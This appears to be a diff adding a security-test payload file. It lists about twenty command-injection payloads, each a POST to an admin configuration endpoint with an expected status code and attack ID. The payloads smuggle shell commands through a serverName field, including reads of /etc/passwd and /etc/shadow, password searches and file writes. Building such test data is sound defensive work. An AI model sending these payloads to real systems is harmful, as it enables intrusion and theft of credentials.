@@ -1,0 +1,30 @@
+# Basic Command Injection Payloads
+# Format: method|endpoint|payload|expected_code|attack_id|description
+
+# Simple Command Injection
+POST|/rest/admin/application-configuration|{"serverName":"localhost; whoami"}|500|cmd_basic_001|Basic whoami
+POST|/rest/admin/application-configuration|{"serverName":"localhost; id"}|500|cmd_basic_002|User identification
+POST|/rest/admin/application-configuration|{"serverName":"localhost; pwd"}|500|cmd_basic_003|Current directory
+POST|/rest/admin/application-configuration|{"serverName":"localhost; ls -la"}|500|cmd_basic_004|List files
+POST|/rest/admin/application-configuration|{"serverName":"localhost; cat /etc/passwd"}|500|cmd_basic_005|Read passwd file
+
+# Command Chaining
+POST|/rest/admin/application-configuration|{"serverName":"localhost && whoami"}|500|cmd_chain_001|AND operator
+POST|/rest/admin/application-configuration|{"serverName":"localhost || whoami"}|500|cmd_chain_002|OR operator
+POST|/rest/admin/application-configuration|{"serverName":"localhost | whoami"}|500|cmd_chain_003|Pipe operator
+POST|/rest/admin/application-configuration|{"serverName":"localhost; whoami; pwd; id"}|500|cmd_chain_004|Multiple commands
+POST|/rest/admin/application-configuration|{"serverName":"localhost & whoami &"}|500|cmd_chain_005|Background execution
+
+# Command Substitution
+POST|/rest/admin/application-configuration|{"serverName":"localhost $(whoami)"}|500|cmd_sub_001|Dollar substitution
+POST|/rest/admin/application-configuration|{"serverName":"localhost `whoami`"}|500|cmd_sub_002|Backtick substitution
+POST|/rest/admin/application-configuration|{"serverName":"localhost $(cat /etc/passwd | head -5)"}|500|cmd_sub_003|Complex substitution
+POST|/rest/admin/application-configuration|{"serverName":"localhost ${IFS}whoami"}|500|cmd_sub_004|IFS bypass
+POST|/rest/admin/application-configuration|{"serverName":"localhost $(/bin/sh -c whoami)"}|500|cmd_sub_005|Shell execution
+
+# File Operations
+POST|/rest/admin/application-configuration|{"serverName":"localhost; echo 'hacked' > /tmp/test.txt"}|500|cmd_file_001|Write file
+POST|/rest/admin/application-configuration|{"serverName":"localhost; cat /etc/shadow"}|500|cmd_file_002|Read shadow file
+POST|/rest/admin/application-configuration|{"serverName":"localhost; find / -name '*.conf' 2>/dev/null"}|500|cmd_file_003|Find config files
+POST|/rest/admin/application-configuration|{"serverName":"localhost; grep -r 'password' /var/www"}|500|cmd_file_004|Search passwords
+POST|/rest/admin/application-configuration|{"serverName":"localhost; tar -czf /tmp/data.tar.gz /etc/"}|500|cmd_file_005|Archive files
